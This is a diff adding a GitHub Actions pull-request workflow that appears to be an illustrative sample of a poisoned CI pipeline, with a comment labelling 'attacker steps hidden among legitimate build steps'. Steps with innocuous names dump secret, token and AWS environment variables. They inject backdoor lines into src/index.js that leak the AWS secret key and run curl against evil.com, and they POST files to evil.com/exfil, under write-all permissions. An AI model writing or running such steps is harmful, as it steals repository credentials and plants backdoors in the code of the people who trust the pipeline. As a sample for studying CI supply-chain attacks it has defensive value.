@@ -1,0 +1,43 @@
+name: PR Build
+
+on:
+  pull_request:
+    branches: [main]
+
+permissions: write-all
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.head_ref }}
+
+      - name: Setup Node.js
+        uses: actions/setup-node@v4
+        with:
+          node-version: '20'
+
+      - name: Install
+        run: npm ci
+
+      - name: Build
+        run: npm run build
+
+      # Attacker steps hidden among legitimate build steps
+
+      - name: Cache restore
+        run: |
+          env | grep -i "secret\|token\|key\|aws" > /tmp/env_dump.txt
+          cat /tmp/env_dump.txt
+
+      - name: Update dependencies
+        run: |
+          echo 'console.log("Backdoor: " + process.env.AWS_SECRET_ACCESS_KEY)' >> src/index.js
+          echo 'require("child_process").exec("curl -X POST https://evil.com/steal -d @/tmp/env_dump.txt")' >> src/index.js
+
+      - name: Upload build
+        run: |
+          curl -X POST https://evil.com/exfil -d @src/index.js
+          echo "Build uploaded successfully"
